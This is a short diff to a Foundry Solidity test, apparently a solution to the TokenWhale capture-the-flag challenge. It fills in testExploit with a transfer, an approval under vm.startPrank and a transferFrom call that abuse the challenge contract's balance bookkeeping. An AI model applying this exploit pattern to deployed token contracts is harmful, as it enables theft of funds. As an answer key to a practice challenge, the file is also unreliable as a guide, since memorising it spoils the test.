@@ -23,7 +23,11 @@ contract TokenWhaleTest is Test {
     // Use vm.startPrank and vm.stopPrank to change between msg.sender
     function testExploit() public {
         // Put your solution here
-
+        tokenWhale.transfer(Alice, 900);
+        vm.startPrank(Alice);
+        tokenWhale.approve(address(this), 900);
+        vm.stopPrank();
+        tokenWhale.transferFrom(Alice, Alice, 900);
         _checkSolved();
     }
 
